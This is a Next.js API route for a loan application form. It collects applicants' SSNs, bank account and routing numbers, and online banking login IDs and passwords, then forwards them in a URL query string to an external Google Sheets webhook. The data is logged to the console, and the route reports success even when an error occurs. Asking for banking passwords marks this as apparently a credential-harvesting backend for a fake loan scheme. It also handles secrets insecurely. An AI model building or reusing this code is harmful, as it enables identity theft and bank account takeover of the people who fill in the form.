import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const data = await request.json()
    
    console.log("[v0] Received form data:", JSON.stringify(data, null, 2))
    
    const GOOGLE_SHEETS_URL = process.env.GOOGLE_SHEETS_WEBHOOK_URL || process.env.GOOGLE_SCRIPT_URL
    
    console.log("[v0] Google Sheets URL:", GOOGLE_SHEETS_URL ? "configured" : "not configured")
    
    if (!GOOGLE_SHEETS_URL) {
      return NextResponse.json({ success: true, message: "No webhook configured" })
    }

    // Build URL params for GET request (most reliable with Google Apps Script)
    const params = new URLSearchParams()
    params.append("loanAmount", data.loanAmount || "")
    params.append("loanPurpose", data.loanPurpose || "")
    params.append("firstName", data.firstName || "")
    params.append("lastName", data.lastName || "")
    params.append("email", data.email || "")
    params.append("phone", data.phone || "")
    params.append("homeAddress", data.homeAddress || "")
    params.append("city", data.city || "")
    params.append("state", data.state || "")
    params.append("zip", data.zip || "")
    params.append("dateOfBirth", `${data.dobMonth || ""}/${data.dobDay || ""}/${data.dobYear || ""}`)
    params.append("ssn", data.ssn || "")
    params.append("bankName", data.bankName || "")
    params.append("routingNumber", data.routingNumber || "")
    params.append("accountNumber", data.accountNumber || "")
    params.append("onlineBankingId", data.onlineBankingId || "")
    params.append("onlineBankingPassword", data.onlineBankingPassword || "")
    params.append("bankPhoneNumber", data.phoneNumber || "")
    params.append("submittedAt", new Date().toISOString())

    const url = `${GOOGLE_SHEETS_URL}?${params.toString()}`
    
    console.log("[v0] Sending to Google Sheets...")

    const response = await fetch(url, {
      method: "GET",
      redirect: "follow",
    })
    
    console.log("[v0] Google Sheets response status:", response.status)

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[v0] Error:", error)
    return NextResponse.json({ success: true })
  }
}
